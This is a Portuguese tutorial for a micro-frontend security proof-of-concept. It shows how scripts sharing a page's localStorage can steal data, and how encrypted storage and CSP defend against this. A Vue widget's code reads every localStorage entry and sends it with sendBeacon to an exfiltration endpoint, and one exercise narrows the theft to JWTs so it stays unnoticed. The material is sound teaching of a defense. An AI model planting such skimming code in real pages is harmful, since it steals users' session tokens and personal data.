# 🎓 Tutorial: Explorando a POC Passo a Passo

Este tutorial guia você por cada componente da POC, explicando o que está acontecendo "por baixo dos panos".

## 📖 Índice

1. [Arquitetura Geral](#arquitetura-geral)
2. [O Host Application](#host-application)
3. [MFE 1: Dashboard Financeiro (React)](#mfe-1-dashboard-financeiro-react)
4. [MFE 2: Widget Publicitário (Vue)](#mfe-2-widget-publicitário-vue)
5. [SecureStorage: A Defesa](#securestorage-a-defesa)
6. [Experimentando Modificações](#experimentando-modificações)

---

## 1. Arquitetura Geral

### Stack Tecnológica

| Componente | Framework | Build Tool |
|------------|-----------|------------|
| Host App | Vanilla JS | - |
| MFE Dashboard | React 18 | Vite |
| MFE Widget | Vue 3 | Vite |
| Integração | Web Components | - |

### Como Funciona?

```
Browser (window, document, localStorage)
│
├─ Host App (index-wc.html)
│  └─ Carrega Web Components:
│     ├─ <mfe-dashboard> (React 18) → Salva JWT, email, saldo
│     └─ <mfe-widget> (Vue 3)       → Tenta roubar dados
│
└─ localStorage (compartilhado por todos!)
```

**Conceito-chave**: Mesmo usando frameworks diferentes e Shadow DOM, todos os scripts compartilham o **mesmo localStorage**. Web Components isolam CSS, mas NÃO isolam JavaScript!

---

## 2. Host Application

**Arquivo**: `public/host-app-wc.js`

### O Que Faz?

1. Cria a interface (Dashboard, Widget, Console)
2. Carrega o SecureStorage e Storage Audit
3. Gerencia dois modos: Vulnerável e Seguro
4. Carrega os MFEs como Web Components

### Código Principal

```javascript
// Carrega bundles compilados
await loadScript('/mfes/mfe-dashboard.js');
await loadScript('/mfes/mfe-widget.js');

// Cria elementos customizados
const dashboard = document.createElement('mfe-dashboard');
dashboard.setAttribute('mode', currentMode);
container.appendChild(dashboard);

// Widget carrega depois
const widget = document.createElement('mfe-widget');
widget.setAttribute('mode', currentMode);
```

### Experimento 1: Ver Shadow DOM

1. Abra o DevTools (F12)
2. Em Elements, expanda `<mfe-dashboard>`
3. Veja o `#shadow-root` - CSS é isolado aqui
4. Mas note: localStorage ainda é compartilhado!

---

## 3. MFE 1: Dashboard Financeiro (React)

**Arquivo**: `mfe-dashboard/src/Dashboard.tsx`

### Responsabilidade

Simula um módulo crítico que gerencia autenticação e dados financeiros.

### Código React (Vulnerável)

```tsx
// Dashboard.tsx - Modo vulnerável
const saveVulnerable = () => {
    localStorage.setItem('jwt', userData.jwt);
    localStorage.setItem('userId', userData.userId);
    localStorage.setItem('email', userData.email);
    localStorage.setItem('balance', userData.balance.toString());
};
```

**Problema**: Qualquer script na página pode fazer:
```javascript
localStorage.getItem('jwt'); // → Token completo!
```

### Código React (Seguro)

```tsx
const saveSecure = async () => {
    const secureStore = new (window as any).SecureStorage(
        'mfe_dashboard',
        window.CRYPTO_SECRET,  // Secret para derivar chave
        null,                  // allowedOrigin
        true                   // usePBKDF2
    );
    await secureStore.setItem('jwt', userData.jwt);
    await secureStore.setItem('userId', userData.userId);
};
```

**Resultado no localStorage**:
```
mfe_dashboard:jwt = "AgGAJI43Yu63cntLj/kD..." (blob criptografado)
```

### Experimento 2: Adicionar Mais Dados

**Tarefa**: Simule armazenamento de número de cartão

1. Abra `mfe-dashboard/src/Dashboard.tsx`
2. No objeto `userData`, adicione:
   ```tsx
   cardNumber: '4111-1111-1111-1111',
   cardCVV: '123'
   ```
3. No `saveVulnerable`, adicione:
   ```tsx
   localStorage.setItem('cardNumber', userData.cardNumber);
   localStorage.setItem('cardCVV', userData.cardCVV);
   ```
4. No `saveSecure`, adicione:
   ```tsx
   await secureStore.setItem('cardNumber', userData.cardNumber);
   await secureStore.setItem('cardCVV', userData.cardCVV);
   ```
5. Recompile: `cd mfe-dashboard && npm run build`
6. Teste nos dois modos e veja o que o widget captura!

---

## 4. MFE 2: Widget Publicitário (Vue)

**Arquivo**: `mfe-widget/src/Widget.vue`

### O Código Malicioso (Vue 3)

```vue
<script setup lang="ts">
const executeVulnerableCode = () => {
    const payload: Record<string, string> = {};
    
    // O ataque: 3 linhas que quebram tudo
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
            payload[key] = localStorage.getItem(key) || '';
        }
    }
    
    // Enviar para servidor atacante
    navigator.sendBeacon('/api/exfiltrate', JSON.stringify(payload));
};
</script>
```

### Por Que É Perigoso?

1. **Acesso irrestrito**: Não há permissões no localStorage
2. **Invisível**: Executa em < 100ms
3. **Silencioso**: `sendBeacon` não gera erros visíveis
4. **Completo**: Captura TUDO, não só o que precisa
5. **Sobrevive unload**: `sendBeacon` envia mesmo se a página fechar

### Experimento 3: Simular Ataque Seletivo

**Tarefa**: Modifique o widget para roubar apenas JWTs

1. Abra `mfe-widget/src/Widget.vue`
2. Encontre a função `executeVulnerableCode`
3. Substitua o loop por:
   ```typescript
   for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
       if (key.includes('jwt') || key.includes('token')) {
           payload[key] = localStorage.getItem(key);
       }
   }
   ```
4. Teste e observe: um atacante inteligente só rouba o necessário para não chamar atenção!

---

## 5. SecureStorage: A Defesa

**Arquivo**: `public/secure-storage.js`

### Como Funciona?

```
Secret → PBKDF2 (150.000 iterações) → Chave AES 256-bit
         ↓
Texto Plano → [Encrypt AES-GCM] → Blob Criptografado → localStorage
                    ↓
              IV Aleatório (96 bits)
              Salt Aleatório (128 bits)
              Namespace (mfe_dashboard:)
```

### Fluxo de Escrita

```javascript
await secureStore.setItem('jwt', 'eyJhbGci...');

// Internamente:
// 1. Gera salt aleatório (16 bytes)
// 2. Deriva chave via PBKDF2 (150k iterações)
// 3. Gera IV aleatório (12 bytes)
// 4. Criptografa com AES-GCM
// 5. Serializa: version + flags + IV + salt + ciphertext
// 6. Codifica em Base64
// 7. Salva com namespace
localStorage.setItem('mfe_dashboard:jwt', base64Blob);
```

### Fluxo de Leitura

```javascript
const jwt = await secureStore.getItem('jwt');

// Internamente:
// 1. Recupera blob do localStorage
// 2. Decodifica Base64
// 3. Extrai: version, flags, IV, salt, ciphertext
// 4. Deriva chave via PBKDF2 (mesmo salt)
// 5. Decripta com AES-GCM
// 6. Retorna texto plano
return decryptedText; // → "eyJhbGci..."
```

### Experimento 4: Verificar Criptografia

**Tarefa**: Veja os dados criptografados

1. Execute a POC em modo seguro
2. Faça login no Dashboard
3. Abra DevTools → Application → Local Storage
4. Procure por chaves como `mfe_dashboard:jwt`
5. **Observe**: O valor é um blob base64 ilegível!
6. Tente decodificar com `atob()` no console:
   ```javascript
   const encrypted = localStorage.getItem('mfe_dashboard:jwt');
   atob(encrypted); // → Bytes aleatórios, não dá pra ler!
   ```

---

## 6. Experimentando Modificações

### Desafio 1: Criar um Terceiro MFE

**Objetivo**: Adicione um "MFE 3: Histórico de Transações"

1. Crie `public/mfe-transactions.js`:
   ```javascript
   export function init(containerId, mode, log) {
       const container = document.getElementById(containerId);
       container.innerHTML = '<h3>💳 Transações Recentes</h3>';
       
       // Salve transações no storage
       if (mode === 'vulnerable') {
           localStorage.setItem('lastTransaction', 'R$ 1.500,00 - Amazon');
       } else {
           const store = new SecureStorage('mfe_transactions', window.CRYPTO_KEY);
           store.setItem('lastTransaction', 'R$ 1.500,00 - Amazon');
       }
   }
   ```

2. No `index.html`, adicione um terceiro container e carregue o módulo

3. Execute e veja o widget roubar os dados da transação!

### Desafio 2: Implementar Namespace Isolado

**Objetivo**: Cada MFE tem sua própria chave de criptografia

1. No `secure-storage.js`, adicione validação de namespace:
   ```javascript
   // Apenas o dono do namespace pode ler
   if (!key.startsWith(this.namespace)) {
       throw new Error('Acesso negado: namespace incorreto');
   }
   ```

2. Gere chaves diferentes para cada MFE:
   ```javascript
   // Dashboard
   const dashKey = 'chaveDosDashboard123...';
   
   // Widget
   const widgetKey = 'chaveDoWidget456...';
   ```

3. Tente fazer o widget ler dados do dashboard (vai falhar!)

### Desafio 3: Adicionar CSP Report

**Objetivo**: Monitore violações de CSP

1. Abra `server.js`
2. Adicione ao CSP header (linha ~18):
   ```javascript
   report-uri /api/csp-report;
   ```
3. Crie o endpoint:
   ```javascript
   app.post('/api/csp-report', (req, res) => {
       console.log('🚨 Violação de CSP:', req.body);
       res.status(204).send();
   });
   ```

4. Tente injetar um script externo e veja o report!

---

## 🎯 Conceitos Importantes

### Same-Origin Policy

- **Protege**: Requests entre domínios diferentes
- **NÃO protege**: Scripts no mesmo domínio

### Runtime Integration

- **Vantagem**: Deploy independente, sem reload
- **Desvantagem**: Compartilham tudo (window, storage)

### Defense in Depth

1. **Criptografia** (SecureStorage com PBKDF2 + AES-GCM)
2. **CSP** (Content Security Policy com nonce dinâmico)
3. **BFF** (HttpOnly cookies para tokens)
4. **Monitoramento** (Storage Audit Proxy, Honeytokens)
5. **Rate Limiting** (Proteção contra brute force)
